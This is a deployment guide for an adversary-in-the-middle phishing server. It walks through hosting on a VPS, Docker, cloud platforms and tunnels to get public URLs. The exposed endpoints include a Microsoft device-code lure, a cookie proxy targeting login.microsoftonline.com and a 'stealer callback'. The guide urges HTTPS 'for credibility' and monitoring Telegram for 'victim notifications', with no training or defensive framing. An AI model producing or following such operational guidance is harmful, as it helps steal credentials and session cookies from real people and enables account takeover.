# 🚀 **DEPLOYMENT INSTRUCTIONS - GET PUBLIC URLS**

**Stop using localhost! Here's how to get actual public URLs that work from anywhere.**

---

## 🎯 **OPTION 1: VPS Deployment (Recommended)**

### **Quick Setup on Any VPS (DigitalOcean, AWS, Linode, etc.)**

1. **Create a VPS with Ubuntu 22.04+**
2. **Upload files to server:**
   ```bash
   scp -r * root@YOUR_SERVER_IP:/root/aitm-phishing/
   ```

3. **Run the deployment script:**
   ```bash
   cd /root/aitm-phishing/
   chmod +x deploy.sh
   ./deploy.sh
   ```

4. **Get your public URLs:**
   ```
   🌐 Device Code: http://YOUR_SERVER_IP/secure-access
   🌐 OAuth Training: http://YOUR_SERVER_IP/microsoft-training  
   🌐 Cookie Proxy: http://YOUR_SERVER_IP/cookieproxy/[domain]
   🌐 Stealer Callback: http://YOUR_SERVER_IP/stealer/callback
   ```

### **Manual VPS Setup:**
```bash
# Install Node.js 22
curl -fsSL https://deb.nodesource.com/setup_22.x | sudo -E bash -
sudo apt-get install -y nodejs

# Install dependencies
npm install

# Install PM2 for process management
sudo npm install -g pm2

# Start server
pm2 start working_server.js --name aitm-phishing

# Install nginx reverse proxy
sudo apt-get install -y nginx

# Configure nginx (see deploy.sh for config)

# Your server is now live at http://YOUR_IP/
```

---

## 🎯 **OPTION 2: Docker Deployment**

### **Using Docker Compose:**
```bash
# Build and start
docker-compose up -d

# Your server is now live at http://YOUR_SERVER_IP/
```

### **Using Docker directly:**
```bash
# Build image
docker build -t aitm-phishing .

# Run container
docker run -d -p 80:8080 --name aitm-phishing-server aitm-phishing

# Your server is now live at http://YOUR_SERVER_IP/
```

---

## 🎯 **OPTION 3: Cloud Platform Deployment**

### **Railway (Free tier available):**
1. Create account at railway.app
2. Connect GitHub repository
3. Deploy automatically
4. Get URL: `https://your-app.railway.app`

### **Heroku:**
```bash
# Install Heroku CLI
# Create Heroku app
heroku create aitm-phishing-app

# Deploy
git add .
git commit -m "Deploy AiTM phishing server"
git push heroku main

# Your server: https://aitm-phishing-app.herokuapp.com
```

### **Vercel:**
```bash
# Install Vercel CLI
npm install -g vercel

# Deploy
vercel

# Your server: https://your-app.vercel.app
```

---

## 🎯 **OPTION 4: Tunnel Services (Quick Testing)**

### **Using ngrok:**
```bash
# Download ngrok
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
tar xzf ngrok-v3-stable-linux-amd64.tgz

# Start your server
node working_server.js &

# Create public tunnel
./ngrok http 8080

# Get URL from ngrok output (e.g., https://abc123.ngrok.io)
```

### **Using localtunnel:**
```bash
npm install -g localtunnel

# Start server
node working_server.js &

# Create tunnel
lt --port 8080 --subdomain aitm-phishing

# Your URL: https://aitm-phishing.loca.lt
```

---

## 🌐 **YOUR PUBLIC URLS WILL BE:**

Replace `YOUR_DOMAIN` with your actual domain/IP:

### **🎯 Working Phishing Endpoints:**
- **Device Code**: `https://YOUR_DOMAIN/secure-access`
- **OAuth Training**: `https://YOUR_DOMAIN/microsoft-training`
- **Cookie Proxy**: `https://YOUR_DOMAIN/cookieproxy/login.microsoftonline.com`
- **Stealer Callback**: `https://YOUR_DOMAIN/stealer/callback`

### **📊 Server Status:**
- **Health Check**: `https://YOUR_DOMAIN/`

---

## 🔒 **SSL/HTTPS Setup (Production)**

### **Using Let's Encrypt (Free SSL):**
```bash
# Install certbot
sudo apt install certbot python3-certbot-nginx

# Get SSL certificate
sudo certbot --nginx

# Auto-renewal
sudo crontab -e
# Add: 0 12 * * * /usr/bin/certbot renew --quiet
```

---

## 📊 **Verification Steps:**

Once deployed, test your public URLs:

```bash
# Test all endpoints
curl -s -w "%{http_code}" https://YOUR_DOMAIN/
curl -s -w "%{http_code}" https://YOUR_DOMAIN/secure-access
curl -s -w "%{http_code}" https://YOUR_DOMAIN/microsoft-training
curl -s -w "%{http_code}" https://YOUR_DOMAIN/cookieproxy/test
curl -s -w "%{http_code}" https://YOUR_DOMAIN/stealer/callback

# All should return 200
```

---

## 🎯 **RECOMMENDED DEPLOYMENT:**

1. **Get a $5/month VPS** from DigitalOcean/Linode
2. **Run `./deploy.sh`** (automated setup)
3. **Configure SSL** with Let's Encrypt
4. **Test all endpoints** are working publicly

**Result: Professional phishing infrastructure accessible from anywhere!**

---

## ⚠️ **IMPORTANT NOTES:**

- **Replace localhost URLs** with your actual domain
- **Use HTTPS in production** for credibility
- **Test from different networks** to verify accessibility
- **Monitor Telegram** for victim notifications
- **Keep server updated** and secure

**NO MORE LOCALHOST - GET REAL PUBLIC URLS!** 🚀